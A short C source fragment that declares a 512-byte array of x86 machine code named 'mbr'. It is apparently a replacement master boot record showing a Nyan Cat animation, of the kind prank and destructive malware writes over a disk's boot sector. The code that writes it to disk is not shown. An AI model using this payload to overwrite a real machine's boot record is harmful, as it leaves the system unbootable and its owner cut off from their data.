char mbr[512] = { // nyan, cant find the original author
  0x0e, 0x1f, 0x0e, 0x07, 0xfc, 0xb9, 0x14, 0x00, 0xbf, 0xbb, 0x7d, 0x0f,
  0x31, 0x96, 0x31, 0xf0, 0xc1, 0xc6, 0x07, 0xab, 0xe2, 0xf5, 0xb8, 0x13,
  0x00, 0xcd, 0x10, 0x68, 0x00, 0xa0, 0x07, 0x6a, 0x04, 0x6a, 0x00, 0xbd,
  0x80, 0x02, 0x31, 0xff, 0xb8, 0x7e, 0x00, 0x31, 0xc9, 0x49, 0xf3, 0xaa,
  0x68, 0x00, 0x50, 0x5f, 0xb1, 0x05, 0x57, 0x01, 0xef, 0xf7, 0xdd, 0xe8,
  0x9c, 0x00, 0x5f, 0x83, 0xc7, 0x18, 0xe2, 0xf2, 0x01, 0xef, 0x68, 0x1b,
  0x7d, 0x5e, 0xe8, 0xa5, 0x00, 0xe8, 0x9f, 0x00, 0x58, 0x5a, 0xa8, 0x01,
  0x74, 0x04, 0xf7, 0xdd, 0xf7, 0xd2, 0xf7, 0xdd, 0x40, 0x52, 0x50, 0x29,
  0xd7, 0xe8, 0x8b, 0x00, 0xb1, 0x05, 0xe8, 0x4a, 0x00, 0xe2, 0xfb, 0x81,
  0xc7, 0xb4, 0x13, 0xe8, 0xa1, 0x00, 0x83, 0xc7, 0x14, 0xe8, 0x9b, 0x00,
  0x83, 0xc7, 0x24, 0xe8, 0x95, 0x00, 0x83, 0xc7, 0x18, 0xe8, 0x8f, 0x00,
  0xb1, 0x14, 0xbb, 0xbb, 0x7d, 0x8b, 0x3f, 0x58, 0x50, 0xc1, 0xe0, 0x04,
  0x29, 0xc7, 0x31, 0xc0, 0x81, 0xff, 0x00, 0xe6, 0x77, 0x08, 0xbe, 0x9f,
  0x7d, 0x53, 0xe8, 0x12, 0x00, 0x5b, 0x83, 0xc3, 0x02, 0xe2, 0xe2, 0x31,
  0xc0, 0x99, 0xb1, 0x02, 0xb4, 0x86, 0xcd, 0x15, 0xe9, 0x73, 0xff, 0x31,
  0xdb, 0xac, 0x93, 0xac, 0x92, 0xad, 0x92, 0x83, 0xfa, 0x01, 0x74, 0x09,
  0x01, 0xd7, 0x89, 0xda, 0xe8, 0x03, 0x00, 0xeb, 0xef, 0xc3, 0x51, 0x57,
  0x89, 0xd9, 0xf3, 0xaa, 0x5f, 0x81, 0xc7, 0x40, 0x01, 0x4a, 0x75, 0xf3,
  0x59, 0xc3, 0x51, 0xb1, 0x05, 0x6a, 0x28, 0x58, 0x6a, 0x18, 0x5b, 0x6a,
  0x0c, 0x5a, 0xe8, 0xe1, 0xff, 0x04, 0x04, 0xe2, 0xf3, 0x59, 0xc3, 0xe8,
  0x00, 0x00, 0xad, 0x01, 0xc7, 0x31, 0xc0, 0xac, 0x91, 0xac, 0x93, 0xac,
  0x99, 0x92, 0xac, 0x57, 0x52, 0xe8, 0xc6, 0xff, 0x5a, 0x5f, 0x80, 0xea,
  0x08, 0x80, 0xc3, 0x08, 0x81, 0xc7, 0xfc, 0x04, 0xe2, 0xed, 0xc3, 0x57,
  0x56, 0xe8, 0xd7, 0xff, 0x5e, 0x5f, 0xc3, 0x00, 0xfb, 0x03, 0x48, 0x48,
  0x00, 0x0c, 0xf6, 0x02, 0x48, 0x40, 0x59, 0x10, 0xfb, 0x03, 0x38, 0x38,
  0x3c, 0x38, 0x0f, 0x04, 0x28, 0x28, 0x00, 0x10, 0xf1, 0x03, 0x28, 0x20,
  0x19, 0x10, 0x19, 0x04, 0xe2, 0x28, 0xec, 0x01, 0x00, 0x08, 0x00, 0xe4,
  0x04, 0x1c, 0xf6, 0x01, 0x00, 0x04, 0x0f, 0xe4, 0xf5, 0x1c, 0xfb, 0x01,
  0x00, 0x08, 0x41, 0xdc, 0x04, 0x2c, 0xf6, 0x01, 0x00, 0x04, 0x00, 0xd0,
  0xe1, 0x00, 0xf6, 0x00, 0xf6, 0x00, 0xf6, 0x04, 0xf6, 0x04, 0xfb, 0x04,
  0x00, 0x00, 0x00, 0x1c, 0xfb, 0x00, 0xf6, 0x04, 0xf6, 0x04, 0xfb, 0x04,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x13, 0x00, 0x00, 0x04,
  0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x04, 0xfb, 0x00,
  0xf6, 0xf4, 0xfa, 0x04, 0xf1, 0x01, 0x00, 0x00, 0x00, 0x02, 0x08, 0x0c,
  0x00, 0x08, 0xfb, 0x01, 0x08, 0x04, 0x19, 0x04, 0x0f, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0xec, 0x04, 0xfb, 0x04, 0x00, 0x00,
  0x00, 0xf4, 0xf5, 0x00, 0x00, 0x04, 0x00, 0x04, 0xfb, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
};

